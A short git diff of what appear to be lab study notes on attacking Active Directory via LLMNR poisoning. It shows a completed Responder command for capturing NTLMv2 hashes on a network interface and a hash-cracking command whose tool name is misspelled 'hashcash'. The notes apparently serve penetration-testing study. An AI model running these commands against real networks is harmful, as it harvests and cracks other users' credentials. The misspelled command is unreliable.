@@ -12,10 +12,13 @@ also make sure to install Active directory certificate services for other attack
 Attacking Active Directory: Initial Attack Vectors
 LLMNR Poisoning
 
-Sudo respo
+Sudo responder -I eth0 -ldwPv
 <img width="696" height="197" alt="image" src="https://github.com/user-attachments/assets/9d0d67af-20d0-4068-b26c-d3cc71c62a3b" />
 
 simulate an event occuring.= - 
 
 hashcash -m 5600 hashes.txt /path/to/wordlist/ 
 <img width="1877" height="390" alt="image" src="https://github.com/user-attachments/assets/da11dacb-30ec-435e-963f-008ea1ae7db7" />
+
+
+
